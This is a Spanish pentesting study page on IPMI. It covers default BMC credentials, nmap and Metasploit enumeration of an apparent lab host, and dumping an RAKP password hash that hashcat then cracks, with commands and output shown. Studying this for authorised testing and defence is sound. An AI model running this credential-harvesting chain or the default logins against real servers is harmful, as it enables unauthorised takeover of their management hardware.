[<- Índice](../../../Pentesting.md)
# Intelligent Platform Management Interface

> ***IPMI*** (*Intelligent Platform Management Interface*) es un conjunto de especificaciones estándar para la administración del *hardware*, comúnmente utilizadas para monitoreo y supervisión del sistema a bajo nivel, incluso si este se encuentra apagado o atorado de alguna forma.

Actua como un **subsistema** independiente del *BIOS*, *CPU*, *Firmware* y sistema operativo del dispositivo, que funciona gracias a que requiere una fuente de poder y conexión *LAN* propias para que funcione correctamente.

Opera a traves de una conexión de red directa al *hardware* del sistema, sin requerir ningun acceso al sistema operativo.

En general, permite monitorear una gran cantidad de aspectos, como temperatura, voltaje, estado de los ventiladores, energía suministrada, *logs* del *hardware*, alertas *SNMP*, etc.
También permite realizar actualizaciones de forma remota al sistema sin necesitar acceso físico al equipo.

**IPMI** se utiliza principalmente de 3 maneras distintas:

- Antes de que el sistema operativo arranque para modificar ajustes en la *BIOS*
- Cuando el equipo esta completamente apagado
- Para acceder al equipo si este falla o se encuentra en un estado no-responsivo

Inicialmente, el protocolo *IPMI* fue publicado por *Intel* en 1998 y actualmente es soportado por más de 200 manufactureras como *Cisco*, *Dell*, *HP*, *Supermicro*, *Intel*, etc.

Los equipos que utilizan *IPMI 2.0* incluso pueden ser administrador via *serial* a través de una red *LAN*, permitiendo a los administradores interactuar con una consola serial.

Más detalladamente, para su funcionamiento *IPMI* requiere:

- ***BMC*** (*Baseboard Management Controller*): Un micro-controlador esencial para *IPMI*.
- ***ICMB*** (*Intelligent Chassis Management Bus*): Una interfaz que permita comunicaciones entre distintos chasís.
- ***IPMB*** (*Intelligent Platform Management Bus*): Extiende la **BMC**.
- ***Memoria IPMI***: Almacena recursos como *log*s de eventos y demás datos del sistema.
- ***Interfaces de comunicación***: Interfaces locales, seriales y *LAN* del sistema, compatibles con **ICMB** y buses de administración **PCI**.

## Configuración

> El servicio se aloja típicamente en el puerto **623** *UDP* y no posee archivos de configuración como tal.

En lo que si varía este servicio, es en las *BMC* utilizadas que no son más que pequeños sistemas operativos *ARM* corriendo alguna versión de *Linux* y conectados directamente sobre la placa madre.

Entre los **BMC** más frecuentes en procedimientos de auditoría son:

- *HP iLO*
- *Dell iDRAC*
- *Supermicro IPMI*

El acceso a un *BMC* muchas veces implica el control total de la placa madre del equipo, y nos vuelve capaces de monitorear, apagar, reiniciar e incluso reinstalar el sistema operativo principal del equipo.

#### Configuraciones peligrosas

Uno de los principales riesgos de *IPMI* son las credenciales por defecto en **BMC**'s bien conocidas, por ejemplo, para los **BMC** más comunes:

| BMC               | Usuario         | Contraseña                                                    |
| ----------------- | --------------- | ------------------------------------------------------------- |
| *Dell iDRAC*      | root            | calvin                                                        |
| *HP iLO*          | *Administrator* | (8 caracteres aleatorios entre letras en mayuscula y números) |
| *Supermicro IPMI* | ADMIN           | ADMIN                                                         |

SIn embargo, incluso si estas credenciales por defecto no funcionan para acceder al *BMC*, existe una vulnerabilidad común en el subprotocolo *RAKP* de *IPMI 2.0* donde, antes de que tome lugar la autenticación, el servidor envía un *hash* SHA1 o MD5 con sal de la contraseña del usuario.

Podemos aprovecharnos de esto para intentar *crackear* el hash con otras herramientas para intentar obtener la contraseña en texto claro.
Por ejemplo, una opción es `hashcat` en el modo `7300` y algún buen diccionario, o en caso de *HP iLO* donde la contraseña es aleatoria, podemos hacer uso de las máscaras para generar las cadenas:

```bash
# HP iLO
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

# Enumeración

### Nmap

> **Nmap** brinda un valioso *script* `ipmi-version` para identificar los detalles básicos del servicio como versión, políticas de usuario, políticas de contraseña, etc.

```bash
sudo nmap -sU 10.129.250.214 -p 623 --script ipmi-version -n

# Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 21:41 CST
# Nmap scan report for 10.129.250.214
# Host is up (0.34s latency).
# 
# PORT    STATE SERVICE
# 623/udp open  asf-rmcp
# | ipmi-version: 
# |   Version: 
# |     IPMI-2.0
# |   UserAuth: password, md5, md2, null
# |   PassAuth: auth_msg, auth_user, non_null_user
# |_  Level: 1.5, 2.0
# 
# Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
```

### Metasploit

#### Escaneo de versión

Alternativamente, *Metasploit* ofrece el modo auxiliar `ipmi_version` para enumerar de igual forma los detalles básicos del servicio:

```msfconsole
msf6 > search ipmi_version

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/scanner/ipmi/ipmi_version  .                normal  No     IPMI Information Discovery


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/ipmi/ipmi_version

msf6 > use 0
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.250.214
rhosts => 10.129.250.214
msf6 auxiliary(scanner/ipmi/ipmi_version) > run
[*] Sending IPMI requests to 10.129.250.214->10.129.250.214 (1 hosts)
[+] 10.129.250.214:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ipmi/ipmi_version) >
```

#### Volcado de hashes

Como se mencionó antes, podemos aprovecharnos de una debilidad en el mecanismo de autenticación para extraer los *hashes* de las contraseñas de los usuarios.

> **Metasploit** ofrece un módulo `ipmi_dumphashes` para realizar este procedimiento sobre el servicio y volcar los usuarios y *hashes* obtenidos.

```msfconsole
msf6 > search ipmi hashes

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ipmi/ipmi_dumphashes  2013-06-20       normal  No     IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/ipmi/ipmi_dumphashes

msf6 > use 0
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.250.214
rhosts => 10.129.250.214
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
[+] 10.129.250.214:623 - IPMI - Hash found: admin:7191876682040000f2f862ac181371a09b310cbbdfbe974ea2cf44a58e78c242d09feb9ef6eba908a123456789abcdefa123456789abcdef140561646d696e:647769c1cdfdc2ae611ae1a588e712dba4d21a0f
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) >
```

Ahora, con el *hash* obtenido para el usuario `admin` podemos crackearlo con apoyo de `hashcat`, solo debemos almacenar en un archivo el *hash* **completo**, es decir, incluyendo los 2 puntos (:) de en medio.

En nuestro ejemplo, sería almacenar `7191876682040000f2f862ac181371a09b310cbbdfbe974ea2cf44a58e78c242d09feb9ef6eba908a123456789abcdefa123456789abcdef140561646d696e:647769c1cdfdc2ae611ae1a588e712dba4d21a0f` en un archivo digamos `hash.txt`.

Una vez hecho, podemos crackearlo con el modo antes mencionado (**7300**) utilizando algun buen diccionario como `rockyou.txt`, de la siguiente manera:

```bash
hashcat -m 7300 -a 0 hash.txt /usr/share/wordlists/passwords/rockyou.txt -O

# hashcat (v6.2.6) starting
# 
# /sys/bus/pci/devices/0000:30:00.0/hwmon/hwmon0/pwm1: No such file or directory
# 
# OpenCL API (OpenCL 2.1 AMD-APP.dbg (3635.0)) - Platform #1 [Advanced Micro Devices, Inc.]
# =========================================================================================
# * Device #1: AMD Radeon Graphics, 3808/7687 MB (3267 MB allocatable), 8MCU
# 
# Minimum password length supported by kernel: 0
# Maximum password length supported by kernel: 31
# 
# Hashes: 1 digests; 1 unique digests, 1 unique salts
# Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
# Rules: 1
# 
# Optimizers applied:
# * Optimized-Kernel
# * Zero-Byte
# * Not-Iterated
# * Single-Hash
# * Single-Salt
# 
# Watchdog: Temperature abort trigger set to 90c
# 
# Host memory required for this attack: 1475 MB
# 
# Dictionary cache hit:
# * Filename..: /usr/share/wordlists/passwords/rockyou.txt
# * Passwords.: 14344384
# * Bytes.....: 139921497
# * Keyspace..: 14344384
# 
# 7191876682040000f2f862ac181371a09b310cbbdfbe974ea2cf44a58e78c242d09feb9ef6eba908a123456789abcdefa123456789abcdef140561646d696e:647769c1cdfdc2ae611ae1a588e712dba4d21a0f:trinity
```

Finalmente, identificamos que la contraseña en texto plano es **trinity**.

Con esta información, podriamos acceder al *BMC* o reutilizar la contraseña en otros servicios según sea el caso.

# Enlaces

[<- OracleTNS](OracleTNS.md) | [Administración remota Linux ->](Linux_GestionRemota.md)